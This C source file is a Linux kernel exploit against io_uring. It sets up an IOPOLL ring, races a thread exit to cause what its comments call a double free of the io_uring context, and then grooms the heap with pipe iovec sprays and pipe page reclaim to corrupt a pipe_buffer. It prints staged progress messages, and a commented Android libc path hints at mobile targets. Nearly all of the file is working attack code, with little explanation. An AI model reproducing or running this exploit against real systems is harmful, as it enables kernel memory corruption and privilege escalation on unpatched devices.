#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stdint.h>
#include <stddef.h>
#include <errno.h>
#include <pthread.h>
#include <fcntl.h>
#include <sched.h>
#include <string.h>
#include <assert.h>
#include <sys/uio.h>
#include <sys/ioctl.h>
#include <sys/wait.h>

typedef uint64_t u64;
typedef int64_t i64;
typedef uint32_t u32;
typedef int32_t i32;
typedef uint16_t u16;
typedef int16_t i16;
typedef uint8_t u8;
typedef int8_t i8;

typedef size_t usize;

typedef int __kernel_rwf_t;

/*
 * IO submission data structure (Submission Queue Entry)
 */
struct io_uring_sqe {
	u8	opcode;		/* type of operation for this sqe */
	u8	flags;		/* IOSQE_ flags */
	u16	ioprio;		/* ioprio for the request */
	i32	fd;		/* file descriptor to do IO on */
	union {
		u64	off;	/* offset into file */
		u64	addr2;
	};
	union {
		u64	addr;	/* pointer to buffer or iovecs */
		u64	splice_off_in;
	};
	u32	len;		/* buffer size or number of iovecs */
	union {
		__kernel_rwf_t	rw_flags;
		u32		fsync_flags;
		u16		poll_events;	/* compatibility */
		u32		poll32_events;	/* word-reversed for BE */
		u32		sync_range_flags;
		u32		msg_flags;
		u32		timeout_flags;
		u32		accept_flags;
		u32		cancel_flags;
		u32		open_flags;
		u32		statx_flags;
		u32		fadvise_advice;
		u32		splice_flags;
	};
	u64	user_data;	/* data to be passed back at completion time */
	union {
		struct {
			/* pack this to avoid bogus arm OABI complaints */
			union {
				/* index into fixed buffers, if used */
				u16	buf_index;
				/* for grouped buffer selection */
				u16	buf_group;
			} __attribute__((packed));
			/* personality to use, if used */
			u16	personality;
			i32	splice_fd_in;
		};
		u64	__pad2[3];
	};
};

enum {
	IOSQE_FIXED_FILE_BIT,
	IOSQE_IO_DRAIN_BIT,
	IOSQE_IO_LINK_BIT,
	IOSQE_IO_HARDLINK_BIT,
	IOSQE_ASYNC_BIT,
	IOSQE_BUFFER_SELECT_BIT,
};

/*
 * sqe->flags
 */
/* use fixed fileset */
#define IOSQE_FIXED_FILE	(1U << IOSQE_FIXED_FILE_BIT)
/* issue after inflight IO */
#define IOSQE_IO_DRAIN		(1U << IOSQE_IO_DRAIN_BIT)
/* links next sqe */
#define IOSQE_IO_LINK		(1U << IOSQE_IO_LINK_BIT)
/* like LINK, but stronger */
#define IOSQE_IO_HARDLINK	(1U << IOSQE_IO_HARDLINK_BIT)
/* always go async */
#define IOSQE_ASYNC		(1U << IOSQE_ASYNC_BIT)
/* select buffer from sqe->buf_group */
#define IOSQE_BUFFER_SELECT	(1U << IOSQE_BUFFER_SELECT_BIT)

/*
 * io_uring_setup() flags
 */
#define IORING_SETUP_IOPOLL	(1U << 0)	/* io_context is polled */
#define IORING_SETUP_SQPOLL	(1U << 1)	/* SQ poll thread */
#define IORING_SETUP_SQ_AFF	(1U << 2)	/* sq_thread_cpu is valid */
#define IORING_SETUP_CQSIZE	(1U << 3)	/* app defines CQ size */
#define IORING_SETUP_CLAMP	(1U << 4)	/* clamp SQ/CQ ring sizes */
#define IORING_SETUP_ATTACH_WQ	(1U << 5)	/* attach to existing wq */
#define IORING_SETUP_R_DISABLED	(1U << 6)	/* start with ring disabled */

enum {
	IORING_OP_NOP,
	IORING_OP_READV,
	IORING_OP_WRITEV,
	IORING_OP_FSYNC,
	IORING_OP_READ_FIXED,
	IORING_OP_WRITE_FIXED,
	IORING_OP_POLL_ADD,
	IORING_OP_POLL_REMOVE,
	IORING_OP_SYNC_FILE_RANGE,
	IORING_OP_SENDMSG,
	IORING_OP_RECVMSG,
	IORING_OP_TIMEOUT,
	IORING_OP_TIMEOUT_REMOVE,
	IORING_OP_ACCEPT,
	IORING_OP_ASYNC_CANCEL,
	IORING_OP_LINK_TIMEOUT,
	IORING_OP_CONNECT,
	IORING_OP_FALLOCATE,
	IORING_OP_OPENAT,
	IORING_OP_CLOSE,
	IORING_OP_FILES_UPDATE,
	IORING_OP_STATX,
	IORING_OP_READ,
	IORING_OP_WRITE,
	IORING_OP_FADVISE,
	IORING_OP_MADVISE,
	IORING_OP_SEND,
	IORING_OP_RECV,
	IORING_OP_OPENAT2,
	IORING_OP_EPOLL_CTL,
	IORING_OP_SPLICE,
	IORING_OP_PROVIDE_BUFFERS,
	IORING_OP_REMOVE_BUFFERS,
	IORING_OP_TEE,

	/* this goes last, obviously */
	IORING_OP_LAST,
};

/*
 * sqe->fsync_flags
 */
#define IORING_FSYNC_DATASYNC	(1U << 0)

/*
 * sqe->timeout_flags
 */
#define IORING_TIMEOUT_ABS	(1U << 0)

/*
 * sqe->splice_flags
 * extends splice(2) flags
 */
#define SPLICE_F_FD_IN_FIXED	(1U << 31) /* the last bit of u32 */

/*
 * IO completion data structure (Completion Queue Entry)
 */
struct io_uring_cqe {
	u64	user_data;	/* sqe->data submission passed back */
	i32	res;		/* result code for this event */
	u32	flags;
};

/*
 * cqe->flags
 *
 * IORING_CQE_F_BUFFER	If set, the upper 16 bits are the buffer ID
 */
#define IORING_CQE_F_BUFFER		(1U << 0)

enum {
	IORING_CQE_BUFFER_SHIFT		= 16,
};

/*
 * Magic offsets for the application to mmap the data it needs
 */
#define IORING_OFF_SQ_RING		0ULL
#define IORING_OFF_CQ_RING		0x8000000ULL
#define IORING_OFF_SQES			0x10000000ULL

/*
 * Filled with the offset for mmap(2)
 */
struct io_sqring_offsets {
	u32 head;
	u32 tail;
	u32 ring_mask;
	u32 ring_entries;
	u32 flags;
	u32 dropped;
	u32 array;
	u32 resv1;
	u64 resv2;
};

/*
 * sq_ring->flags
 */
#define IORING_SQ_NEED_WAKEUP	(1U << 0) /* needs io_uring_enter wakeup */
#define IORING_SQ_CQ_OVERFLOW	(1U << 1) /* CQ ring is overflown */

struct io_cqring_offsets {
	u32 head;
	u32 tail;
	u32 ring_mask;
	u32 ring_entries;
	u32 overflow;
	u32 cqes;
	u32 flags;
	u32 resv1;
	u64 resv2;
};

/*
 * cq_ring->flags
 */

/* disable eventfd notifications */
#define IORING_CQ_EVENTFD_DISABLED	(1U << 0)

/*
 * io_uring_enter(2) flags
 */
#define IORING_ENTER_GETEVENTS	(1U << 0)
#define IORING_ENTER_SQ_WAKEUP	(1U << 1)
#define IORING_ENTER_SQ_WAIT	(1U << 2)

/*
 * Passed in for io_uring_setup(2). Copied back with updated info on success
 */
struct io_uring_params {
	u32 sq_entries;
	u32 cq_entries;
	u32 flags;
	u32 sq_thread_cpu;
	u32 sq_thread_idle;
	u32 features;
	u32 wq_fd;
	u32 resv[3];
	struct io_sqring_offsets sq_off;
	struct io_cqring_offsets cq_off;
};

/*
 * io_uring_params->features flags
 */
#define IORING_FEAT_SINGLE_MMAP		(1U << 0)
#define IORING_FEAT_NODROP		(1U << 1)
#define IORING_FEAT_SUBMIT_STABLE	(1U << 2)
#define IORING_FEAT_RW_CUR_POS		(1U << 3)
#define IORING_FEAT_CUR_PERSONALITY	(1U << 4)
#define IORING_FEAT_FAST_POLL		(1U << 5)
#define IORING_FEAT_POLL_32BITS 	(1U << 6)

/*
 * io_uring_register(2) opcodes and arguments
 */
enum {
	IORING_REGISTER_BUFFERS			= 0,
	IORING_UNREGISTER_BUFFERS		= 1,
	IORING_REGISTER_FILES			= 2,
	IORING_UNREGISTER_FILES			= 3,
	IORING_REGISTER_EVENTFD			= 4,
	IORING_UNREGISTER_EVENTFD		= 5,
	IORING_REGISTER_FILES_UPDATE		= 6,
	IORING_REGISTER_EVENTFD_ASYNC		= 7,
	IORING_REGISTER_PROBE			= 8,
	IORING_REGISTER_PERSONALITY		= 9,
	IORING_UNREGISTER_PERSONALITY		= 10,
	IORING_REGISTER_RESTRICTIONS		= 11,
	IORING_REGISTER_ENABLE_RINGS		= 12,

	/* this goes last */
	IORING_REGISTER_LAST
};

struct io_uring_files_update {
	u32 offset;
	u32 resv;
	u64 __attribute__((aligned(8))) /* i32 * */ fds;
};

#define IO_URING_OP_SUPPORTED	(1U << 0)

struct io_uring_probe_op {
	u8 op;
	u8 resv;
	u16 flags;	/* IO_URING_OP_* flags */
	u32 resv2;
};

struct io_uring_probe {
	u8 last_op;	/* last opcode supported */
	u8 ops_len;	/* length of ops[] array below */
	u16 resv;
	u32 resv2[3];
	struct io_uring_probe_op ops[0];
};

struct io_uring_restriction {
	u16 opcode;
	union {
		u8 register_op; /* IORING_RESTRICTION_REGISTER_OP */
		u8 sqe_op;      /* IORING_RESTRICTION_SQE_OP */
		u8 sqe_flags;   /* IORING_RESTRICTION_SQE_FLAGS_* */
	};
	u8 resv;
	u32 resv2[3];
};

/*
 * io_uring_restriction->opcode values
 */
enum {
	/* Allow an io_uring_register(2) opcode */
	IORING_RESTRICTION_REGISTER_OP		= 0,

	/* Allow an sqe opcode */
	IORING_RESTRICTION_SQE_OP		= 1,

	/* Allow sqe flags */
	IORING_RESTRICTION_SQE_FLAGS_ALLOWED	= 2,

	/* Require sqe flags (these flags must be set on each submission) */
	IORING_RESTRICTION_SQE_FLAGS_REQUIRED	= 3,

	IORING_RESTRICTION_LAST
};

#define SYS_IO_URING_SETUP 425
#define SYS_IO_URING_ENTER 426

#define LOG(fmt, ...) do { \
  printf(fmt "\n", ##__VA_ARGS__); \
  } while(0)

#define SYSCHK(x) ({                  \
  __typeof__(x) __res = (x);          \
  if (__res == (__typeof__(x))-1) {   \
    LOG("SYSCHK(" #x ") = %d\n", __res);\
    int error_val = errno;            \
    LOG("errno: %d\n", error_val);    \
    exit(1);                          \
  }                                   \
  __res;                              \
})

#define CHECK(x, n) ({                  \
  __typeof__(x) __res = (x);          \
  if (__res != n) {   \
    LOG("SYSCHK(" #x ") = %d\n", __res);\
    int error_val = errno;            \
    LOG("errno: %d\n", error_val);    \
    exit(1);                          \
  }                                   \
  __res;                              \
})

int pin_to_cpu(int cpu) {
    int rc;
    int num_cpus = sysconf(_SC_NPROCESSORS_ONLN);
    cpu_set_t *cpu_setp = CPU_ALLOC(num_cpus);
    size_t size = CPU_ALLOC_SIZE(num_cpus);
    CPU_ZERO_S(size, cpu_setp);
    if (cpu >= 0 && cpu < num_cpus) {
        CPU_SET_S(cpu, size, cpu_setp);
    } else {
        for (int i = 0; i < num_cpus; i++) {
            CPU_SET_S(i, size, cpu_setp);
        }
    }

    rc = sched_setaffinity(0, size, cpu_setp);
    // if (rc) {
    //     printf("cpu %d failed to be pinned (num cpus = %d)\n", cpu, num_cpus);
    //     perror("sched_setaffinity");
    // }
    CPU_FREE(cpu_setp);
    return rc;
}

void panic(const char *msg) {
  puts(msg);
  exit(1);
}

typedef struct {
  int fd;
  struct io_uring_params params;
  u8 *sq_ring;
  struct io_uring_sqe *sq_entries;
  u8 *cq_ring;
} IoUring;

IoUring io_uring_setup() {
  struct io_uring_params params = { 0 };
  params.flags = IORING_SETUP_IOPOLL;
  int fd = SYSCHK(syscall(SYS_IO_URING_SETUP, 0x10, &params));

  // ring buffer of indicies
  u8 *sq_ring = mmap(
    NULL,
    params.sq_off.array + params.sq_entries * sizeof(u32),
    PROT_READ | PROT_WRITE,
    MAP_SHARED | MAP_POPULATE,
    fd,
    IORING_OFF_SQ_RING
  );

  // array of sq entries
  struct io_uring_sqe *sq_entries = mmap(
    NULL,
    params.sq_entries * sizeof(struct io_uring_sqe),
    PROT_READ | PROT_WRITE,
    MAP_SHARED | MAP_POPULATE,
    fd,
    IORING_OFF_SQES
  );

  // cq ring
  u8 *cq_ring = mmap(
    NULL,
    params.cq_off.cqes + params.cq_entries * sizeof(struct io_uring_cqe),
    PROT_READ | PROT_WRITE,
    MAP_SHARED | MAP_POPULATE,
    fd,
    IORING_OFF_CQ_RING
  );

  IoUring out = {
    .fd = fd,
    .params = params,
    .sq_ring = sq_ring,
    .sq_entries = sq_entries,
    .cq_ring = cq_ring,
  };

  return out;
}

u32 *io_uring_tail_ptr(IoUring *uring) {
  return (u32 *) (uring->sq_ring + uring->params.sq_off.tail);
}

u32 io_uring_mask(IoUring *uring) {
  return *(u32 *) (uring->sq_ring + uring->params.sq_off.ring_mask);
}

u32 *io_uring_submission_queue(IoUring *uring) {
  return (u32 *) (uring->sq_ring + uring->params.sq_off.array);
}

struct io_uring_cqe *io_uring_get_cqe(IoUring *uring) {
  return (struct io_uring_cqe *) (uring->cq_ring + uring->params.cq_off.cqes);
}

void io_uring_submit_sqe(IoUring *io_uring, struct io_uring_sqe *sqe) {
  usize index = sqe - io_uring->sq_entries;

  u32 *queue = io_uring_submission_queue(io_uring);
  u32 *tail = io_uring_tail_ptr(io_uring);
  u32 mask = io_uring_mask(io_uring);
  queue[*tail & mask] = index;
  *tail += 1;
}

void io_uring_enter_submit(IoUring *io_uring, u32 submit_count) {
  SYSCHK(syscall(SYS_IO_URING_ENTER, io_uring->fd, submit_count, 0, 0, NULL, 0));
}

void io_uring_enter_poll(IoUring *io_uring, u32 poll_count) {
  SYSCHK(syscall(SYS_IO_URING_ENTER, io_uring->fd, 0, poll_count, IORING_ENTER_GETEVENTS, NULL, 0));
}

void init_barrier(pthread_barrier_t *barrier, u32 count) {
  pthread_barrier_init(barrier, NULL, count);
}

typedef struct {
  IoUring io_uring;
  int read_poll_fd;
  pthread_t trigger_thread;
  pthread_barrier_t setup_barrier;
  pthread_barrier_t setup_done_barrier;
  pthread_barrier_t trigger_barrier;
  char *buf;
} Context;

void *do_poll(void *arg) {
  Context *context = (Context *) arg;
  pin_to_cpu(0);

  io_uring_enter_poll(&context->io_uring, 1);

  for (;;) {
    sleep(100);
  }

  return NULL;
}

void poll_event(Context *context) {
  pthread_t thread;
  pthread_create(&thread, NULL, do_poll, context);
  pthread_join(thread, NULL);
}

// void trigger_bug(Context *context) {
//   struct io_uring_sqe *sqe = &context->io_uring.sq_entries[0];
//   memset(sqe, 0, sizeof(struct io_uring_sqe));
//   sqe->opcode = IORING_OP_READ;
//   sqe->fd = context->read_poll_fd;
//   sqe->off = 0;
//   sqe->addr = (usize) context->buf;
//   sqe->len = 4096;
//   sqe->user_data = 0x6969;

//   io_uring_submit_sqe(&context->io_uring, sqe);
//   io_uring_enter_submit(&context->io_uring, 1);

//   poll_event(context);
// }

Context context = { 0 };

void *trigger_thread(void *arg) {
  pin_to_cpu(0);
  pthread_barrier_wait(&context.setup_barrier);

  // submit read which will be io polled by other task
  struct io_uring_sqe *sqe = &context.io_uring.sq_entries[0];
  memset(sqe, 0, sizeof(struct io_uring_sqe));
  sqe->opcode = IORING_OP_READ;
  sqe->fd = context.read_poll_fd;
  sqe->off = 0;
  sqe->addr = (usize) context.buf;
  sqe->len = 4096;
  sqe->user_data = 0x6969;

  io_uring_submit_sqe(&context.io_uring, sqe);
  io_uring_enter_submit(&context.io_uring, 1);

  struct io_uring_cqe *cqes = io_uring_get_cqe(&context.io_uring);
  printf("dummy completion:\nret value: %d\nuser cookie: %lx\n", cqes[0].res, cqes[0].user_data);
  printf("dummy completion:\nret value: %d\nuser cookie: %lx\n", cqes[1].res, cqes[1].user_data);

  pthread_barrier_wait(&context.setup_done_barrier);

  pthread_barrier_wait(&context.trigger_barrier);
  // after trigger barrier hit, exit thread which triggers double free of io_uring context in current task

  return NULL;
}

void setup_bug() {
  init_barrier(&context.setup_barrier, 2);
  init_barrier(&context.setup_done_barrier, 2);
  init_barrier(&context.trigger_barrier, 2);
  // context.read_poll_fd = SYSCHK(open("/apex/com.android.runtime/lib64/bionic/libc.so", O_RDONLY | O_DIRECT | O_NONBLOCK));
  context.read_poll_fd = SYSCHK(open("/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY | O_DIRECT | O_NONBLOCK));
  context.buf = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

  // spawn other thread before allocating io uring stuff
  pthread_create(&context.trigger_thread, NULL, trigger_thread, NULL);

  context.io_uring = io_uring_setup();

  // have other thread submit read
  pthread_barrier_wait(&context.setup_barrier);

  // submit 1 random read, to give our own task a valid current->io_uring
  // otherwise it is null, since there is a bug in kernel poll with iopoll does not set this up
  struct io_uring_sqe *sqe = &context.io_uring.sq_entries[0];
  memset(sqe, 0, sizeof(struct io_uring_sqe));
  sqe->opcode = IORING_OP_READ;
  sqe->fd = context.read_poll_fd;
  sqe->off = 0;
  sqe->addr = (usize) context.buf;
  sqe->len = 4096;
  sqe->user_data = 0x69696969;

  io_uring_submit_sqe(&context.io_uring, sqe);
  io_uring_enter_submit(&context.io_uring, 1);

  // wait for it to finish
  pthread_barrier_wait(&context.setup_done_barrier);
}

void trigger_bug() {
  io_uring_enter_poll(&context.io_uring, 2);
  pthread_barrier_wait(&context.trigger_barrier);
  pthread_join(context.trigger_thread, NULL);
}

void trigger_process(int start_step_pipes[2], int end_step_pipes[2]) {
  pin_to_cpu(0);

  char buf[16] = { 0 };
  SYSCHK(read(start_step_pipes[0], buf, 1));
  setup_bug();
  SYSCHK(write(end_step_pipes[1], buf, 1));

  SYSCHK(read(start_step_pipes[0], buf, 1));
  trigger_bug();
  SYSCHK(write(end_step_pipes[1], buf, 1));

  exit(0);
}

void call_trigger_process(int start_step_pipes[2], int end_step_pipes[2]) {
  char buf[16] = { 0 };
  SYSCHK(write(start_step_pipes[1], buf, 1));
  SYSCHK(read(end_step_pipes[0], buf, 1));
}

int sync_pipes[2] = { 0 };
char global_buffer[0x4000] = { 0 };

#define MAX_PIPE_NUM 0x400
#define PIPE_PAGE_NUM 0x600
#define FIRST_PIPE_SPRAY 0x180
#define MAX_256_PIPE 0x400

int pipes[MAX_PIPE_NUM][2] = { 0 };
int pipe_pages[PIPE_PAGE_NUM][2] = { 0 };

void *do_iov_spray(void *idx) {
  pin_to_cpu(0);

  unsigned long pipe_idx = (unsigned long)(idx);
  char data[0x100] = {};
  struct iovec iovec_array[256 / 16];
  assert(sizeof(iovec_array) == 256);

  for (int i = 0; i < 256 / 16; i++) {
    iovec_array[i].iov_len = 1;
    iovec_array[i].iov_base =
        (void *)((char *)global_buffer + pipe_idx * 16 + i);
  }

  if (pipe_idx >= MAX_256_PIPE) {
    goto spray_256;
  }

  read(pipes[pipe_idx][0], data, 1);
  CHECK(*data, 'S');
  write(sync_pipes[1], "E", 1);
  // printf("pipe %ld spaied\n", pipe_idx);
  // if (pipe_idx == 0) printf("allocating 256 for 0\n");
  // printf("pipe idx %ld allocated\n", pipe_idx);
  int res = readv(pipes[pipe_idx][0], iovec_array, 256 / 16);
  if (res != 256 / 16) {
    printf("pipe %ld res is %d\n", pipe_idx, res);
    // iov might be corrupted, do that again without iov
    res = read(pipes[pipe_idx][0], (char *)global_buffer + pipe_idx * 16,
               256 / 16);
    printf("second read, res is %d\n", res);
  }
  write(sync_pipes[1], "E", 1);

spray_256:
  // wait for signal
  // *data = 0;
  // read(pipes[pipe_idx][0], data, 1);
  // assert(*data == 'S');
  // write(sync_pipes[1], "S", 1);

  // // after having the signal, do the spray
  // readv(pipes[pipe_idx][0], iovec_array, 256/16);
  // // keep sleeping to prevent too many freed pages

  // write(sync_pipes[1], "S", 1);
  while (1) {
    sleep(10000);
  }
}

void exploit() {
  int start_step_pipes[2] = { 0 };
  int end_step_pipes[2] = { 0 };

  SYSCHK(pipe(start_step_pipes));
  SYSCHK(pipe(end_step_pipes));

  int pid = SYSCHK(fork());
  if (pid == 0) {
    trigger_process(start_step_pipes, end_step_pipes);
  }

  pin_to_cpu(0);

  int exp_pipes[4] = { 0 };

  // puts("trigger");
  // setup_bug();
  // trigger_bug();
  // return;

  // char global_buffer[0x100] = { 0 };

  for (int i = 0; i < MAX_PIPE_NUM; i++) {
    printf("%d\n", i);
    SYSCHK(pipe(pipes[i]));
    // prefault the page
    CHECK(fcntl(pipes[i][1], F_SETPIPE_SZ, 0x1000), 0x1000);
    write(pipes[i][1], global_buffer, 1);
    CHECK(read(pipes[i][0], global_buffer, 1), 1);
  }

  // prepare sync pipe
  SYSCHK(pipe(sync_pipes));
  CHECK(fcntl(sync_pipes[1], F_SETPIPE_SZ, 0x1000), 0x1000);
  write(sync_pipes[1], global_buffer, 1);
  read(sync_pipes[0], global_buffer, 1);

  // prepare exp pipe
  SYSCHK(pipe(exp_pipes));
  write(exp_pipes[1], global_buffer, 1);
  read(exp_pipes[0], global_buffer, 1);
  write(exp_pipes[1], global_buffer, 1);

  // a good time to setup context for the second stage
  for (int i = 0; i < PIPE_PAGE_NUM; i++) {
    if (pipe(pipe_pages[i]) < 0) {
      perror("pipe");
      exit(0);
    }
    CHECK(fcntl(pipe_pages[i][1], F_SETPIPE_SZ, 0x1000), 0x1000);
  }

  for (unsigned long i = 0; i < MAX_PIPE_NUM; i++) {
    pthread_t pid;
    pthread_create(&pid, NULL, do_iov_spray, (void *)i);
  }
  printf("preparing...\n");
  sleep(1);

  printf("[*] STAGE 1: defragmentation\n");
  // spray the first part
  for (int i = 0; i < FIRST_PIPE_SPRAY; i++) {
    usleep(10);
    write(pipes[i][1], "S", 1);
  }

  // sync with the spray
  int count = FIRST_PIPE_SPRAY;
  while (count) {
    usleep(10);
    int res = read(sync_pipes[0], global_buffer, count);
    count -= res;
  }

  printf("[*] STAGE 2: trigger the bug\n");
  call_trigger_process(start_step_pipes, end_step_pipes);

  // allocate a pipe buffer for this
  CHECK(fcntl(exp_pipes[1], F_SETPIPE_SZ, 0x4000), 0x4000);
  // fill the slab with other iovs
  for (int i = FIRST_PIPE_SPRAY; i < MAX_256_PIPE; i++) {
    // usleep(10);
    write(pipes[i][1], "S", 1);
  }

  // sync with the spray
  count = MAX_256_PIPE - FIRST_PIPE_SPRAY;
  while (count) {
    usleep(10);
    int res = read(sync_pipes[0], global_buffer + 0x300, count);
    // printf("read res : %d\n", res);
    count -= res;
  }

  call_trigger_process(start_step_pipes, end_step_pipes);

  int status = 0;
  SYSCHK(waitpid(pid, &status, 0));
  
  // sleep for a while making sure the memory is freed
  usleep(1000 * 1000);

  printf("[*] STAGE 3: free the cache\n");
  // now free the iov
  for (int i = MAX_256_PIPE - 1; i >= 0; i--) {
    usleep(10);
    write(pipes[i][1], global_buffer + 0x200, 256 / 16);
  }

  // sync with the free
  count = MAX_256_PIPE;
  while (count) {
    usleep(10);
    int res = read(sync_pipes[0], global_buffer + 0x300, count);
    // printf("read res : %d\n", res);
    count -= res;
  }

  printf("[*] STAGE 4: reclaim the page\n");
  memset(global_buffer, 'A', 0x1000);
  for (int i = 0; i < PIPE_PAGE_NUM; i++) {
    write(pipe_pages[i][1], global_buffer, 0x1000);
  }

  int size = 0;
  // now check pipe_buffer
  ioctl(exp_pipes[1], FIONREAD, &size);
  printf("FIONREAD pipe 1 is %x\n", size);
  if (size != 0x41414141) {
    printf("failed, please retry\n");
    fflush(stdout);
    sleep(3);
    return;
  }
}

void *thread(void *a) {
  return NULL;
}

int main() {
  puts("Starting exploit...");

  pthread_t t;
  pthread_create(&t, NULL, thread, NULL);

  pin_to_cpu(0);

  // Context context = {
  //   .io_uring = io_uring_setup(),
  //   .read_poll_fd = SYSCHK(open("/apex/com.android.runtime/lib64/bionic/libc.so", O_RDONLY | O_DIRECT | O_NONBLOCK)),
  //   .buf = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0),
  // };

  //exploit();

  // trigger_bug(&context);

  // printf("%lx\n", io_uring_get_cqe(&context.io_uring)[0].user_data);
  // printf("%d\n", io_uring_get_cqe(&context.io_uring)[0].res);

  // puts(context.buf);

  return 0;
}
